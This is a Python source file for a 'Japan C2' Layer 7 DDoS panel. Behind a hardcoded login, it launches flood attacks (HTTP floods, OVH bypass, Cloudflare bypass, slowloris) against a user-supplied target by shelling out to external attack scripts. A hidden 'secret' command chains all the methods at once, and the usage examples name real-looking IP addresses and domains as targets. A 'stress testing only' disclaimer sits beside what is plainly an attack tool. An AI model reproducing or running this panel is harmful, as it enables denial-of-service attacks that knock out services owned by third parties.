# Japan C2 Layer 7 ONLY #
# Created By @9_hl4 #

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.6)
    clear()
    print(f'''



     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.6)
    clear()
    print(f'''







     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
    print('\x1b[38;2;51;51;255mJapan C2 \x1b[38;2;153;51;255m | Layer 7 Net \x1b[38;2;255;51;255m | Version 1.0')
    print("")


def rules():
    clear()
    si()
    print(f'''
                                \x1b[38;2;51;51;255m╔═════\x1b[38;2;153;51;255m══════════╗
                                \x1b[38;2;51;51;255m║     \x1b[38;2;153;51;255mRules     \x1b[38;2;255;51;255m║
                \x1b[38;2;51;51;255m╔═══════════════╩═════\x1b[38;2;153;51;255m══════════╩═══════════════╗
                \x1b[38;2;51;51;255m║ \x1b[38;2;51;51;255m1.\x1b[38;2;153;51;255m Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;255;51;255m║
                \x1b[38;2;51;51;255m║ \x1b[38;2;0;255;255m2.\x1b[38;2;153;51;255m Only attack stress testing servers         \x1b[38;2;255;51;255m║
                \x1b[38;2;51;51;255m║ \x1b[38;2;0;255;255m3.\x1b[38;2;153;51;255m Don't skid the panel                       \x1b[38;2;255;51;255m║
                \x1b[38;2;51;51;255m║ \x1b[38;2;0;255;255m4.\x1b[38;2;153;51;255m Give a star to the github repository       \x1b[38;2;255;51;255m║
                \x1b[38;2;51;51;255m║ \x1b[38;2;0;255;255m5.\x1b[38;2;153;51;255m The creator does not do any harm           \x1b[38;2;255;51;255m║
                \x1b[38;2;51;51;255m╚═════════════════════\x1b[38;2;153;51;255m══════════════════════════╝
''')

    
def layer7():
    clear()
    si()
    print(f'''
                \x1b[38;2;51;51;255m╚══════════════════╦════════════\x1b[38;2;153;51;255m════════════════\x1b[38;2;255;51;255m═══════╦══════════════════╝
                \x1b[38;2;51;51;255m                   ║      Godly \x1b[38;2;153;51;255mLayer 7 Methods\x1b[38;2;255;51;255m        ║
                \x1b[38;2;51;51;255m  ╔════════════════╩════════════\x1b[38;2;153;51;255m═══════════════\x1b[38;2;255;51;255m════════╩═══════════════╗
                \x1b[38;2;51;51;255m  ╚════════════════╦════════════\x1b[38;2;153;51;255m════╦══════════\x1b[38;2;255;51;255m════════╦═══════════════╝                  
                \x1b[38;2;51;51;255m                   ║            \x1b[38;2;153;51;255m              \x1b[38;2;255;51;255m         ║
                \x1b[38;2;51;51;255m   ╔═══════════════╩════════════\x1b[38;2;153;51;255m══════════════\x1b[38;2;255;51;255m═════════╩══════════════╗
                \x1b[38;2;51;51;255m   ║                         HTT\x1b[38;2;153;51;255mP-RAND        \x1b[38;2;255;51;255m                        ║
                \x1b[38;2;51;51;255m   ║                         HTT\x1b[38;2;153;51;255mP-SOCKET      \x1b[38;2;255;51;255m                        ║
                \x1b[38;2;51;51;255m   ║                         HTT\x1b[38;2;153;51;255mP-RAW         \x1b[38;2;255;51;255m                        ║
                \x1b[38;2;51;51;255m   ║                         OVH\x1b[38;2;153;51;255m-AMP          \x1b[38;2;255;51;255m                        ║
                \x1b[38;2;51;51;255m   ║                         OVH\x1b[38;2;153;51;255m-BEAM         \x1b[38;2;255;51;255m                        ║
                \x1b[38;2;51;51;255m   ║                         OVH\x1b[38;2;153;51;255m-RAW          \x1b[38;2;255;51;255m                        ║
                \x1b[38;2;51;51;255m   ║                         CF-\x1b[38;2;153;51;255mBYPASS        \x1b[38;2;255;51;255m                        ║
                \x1b[38;2;51;51;255m   ║                         SLO\x1b[38;2;153;51;255mW             \x1b[38;2;255;51;255m                        ║
                \x1b[38;2;51;51;255m   ╚════════════════════════════\x1b[38;2;153;51;255m══════════════\x1b[38;2;255;51;255m════════════════════════╝
                
                
                
                
                
''')

def menu():
    sys.stdout.write(f"         \x1b]2;Japan C2 --> Infected: [{bots}] | Online Users: [1] | Methods: [8] | Bypass: [11] \x07")
    clear()
    si()
    print("")
    print("""
 \x1b[38;2;51;51;255m               
 \x1b[38;2;51;51;255m                                                                ╦  ╔\x1b[38;2;153;51;255m═╗  ╔═╗\x1b[38;2;255;51;255m  ╔═╗  ╔╗╔
\x1b[38;2;51;51;255m                                                                 ║  ╠\x1b[38;2;153;51;255m═╣  ╠═╝\x1b[38;2;255;51;255m  ╠═╣  ║║║
\x1b[38;2;51;51;255m                                                                ╚╝  ╩ \x1b[38;2;153;51;255m╩  ╩  \x1b[38;2;255;51;255m  ╩ ╩  ╝╚╝
\x1b[38;2;51;51;255m                  \x1b[38;2;51;51;255m╚══════════════════╦═══════════\x1b[38;2;153;51;255m═══════\x1b[38;2;255;51;255m═════════════════╦══════════════════╝
\x1b[38;2;51;51;255m                                                         ║        Cre\x1b[38;2;153;51;255mated By\x1b[38;2;255;51;255m @9_hl4     \x1b[38;2;51;51;255m     ║
\x1b[38;2;51;51;255m                                        \x1b[38;2;51;51;255m╔════════════════╩═══════════\x1b[38;2;153;51;255m═══════\x1b[38;2;255;51;255m═════════════════╩═══════════════╗ 
\x1b[38;2;51;51;255m                                 ╔══════╝                    Type "he\x1b[38;2;153;51;255mlp" to \x1b[38;2;255;51;255mshow commands                    ╚══════╗
\x1b[38;2;51;51;255m             \x1b[38;2;51;51;255m╚══════════════════════════════════\x1b[38;2;153;51;255m═════════\x1b[38;2;255;51;255m═══════════════════════════════════════╝                         
""")

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;51;51;255m╔══[Japan\x1b[38;2;153;51;255m@Japan]
╚══\x1b[38;2;255;51;255m═══➤ \x1b[38;2;239;239;239m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "rules" or cnc == "RULES" or cnc == "Rules":
            rules()
            
# LAYER 7 METHODS

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')
        
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
    
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

        elif "secret" in cnc:
            url = cnc.split()[1]
            time = cnc.split()[2]
            thread = cnc.split()[3]
            per = cnc.split()[4]
            port = cnc.split()[5]
            conns = cnc.split()[6]
            os.system(f'node cf.js {url} {time} {thread} && node HTTP-RAND.js {url} {time} && node HTTP-RAW {url} {time} && node HTTP-SOCKET {url} {per} {time} && node slow.js {url} {time} && ./OVH-BEAM GET {url} {port} {time} 1024 && ./ovh-raw GET {url} {port} {time} {conns}')
            
            


        elif "help" in cnc:
            print(f'''
LAYER7  ► SHOW LAYER7 METHODS
CLEAR   ► CLEAR TERMINAL
RULES   ► SHOW C2 RULES
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "japan"
    passwd = "c2"
    username = input("⚡ Username: ")
    password = getpass.getpass(prompt='⚡ Password: ')
    if username != user or password != passwd:
        print("")
        print("⚡ Failed")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ Welcome to Japan C2!")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
